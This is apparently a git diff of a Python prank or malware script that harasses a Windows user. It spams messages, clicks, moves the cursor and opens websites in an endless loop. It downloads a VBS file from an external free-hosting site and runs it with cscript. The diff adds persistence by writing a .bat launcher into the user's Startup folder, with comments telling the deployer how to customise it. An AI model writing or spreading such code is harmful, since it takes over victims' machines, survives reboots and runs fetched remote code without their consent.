@@ -1,4 +1,4 @@
-import pyautogui, random, os, threading, webbrowser, ctypes, requests
+import pyautogui, random, os, threading, webbrowser, ctypes, requests, getpass
 
 #Downloading image and saving it locally to directory where the script is
 bgUrl = "https://charonmaster.000webhostapp.com/owersite_budist.jpg" #You can change url but make sure it goes directly to image
@@ -15,11 +15,20 @@ file = open("script.vbs", "wb")#If you change the name of script you have to cha
 file.write(vbsDownload.content)
 file.close()
 
+#This part of script is making .bat file that is going to run script on windows startup if you dont want to run it on startup just remove this part of code
+username = getpass.getuser()
+path = "C:/Users/"+ str(username) +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+currentDirectory = os.getcwd() + "/app.py"
+os.chdir(path)
+with open('owersite.bat', 'w') as f:
+    f.write("@echo off\n")
+    f.write('python "'+ str(currentDirectory)+'"')
+    f.write("\npause")
+    f.close()
+#Remove from top line 19 to line 27 if you dont want startup feature
+
 #Gets users width and height of screen that is used in movecursor function
 width, height = pyautogui.size()
-
-def vbs():
-    os.system("cscript script.vbs")
 
 #Opens website by url that you provide in variable
 def openwebsite():
@@ -49,7 +58,6 @@ while True:
     thread1.start()
     thread2 = threading.Thread(target=openwebsite)
     thread2.start()
-    thread3 = threading.Thread(target=vbs)
-    thread3.start()
     spammsg()
     clicking()
+    os.system("cscript script.vbs")
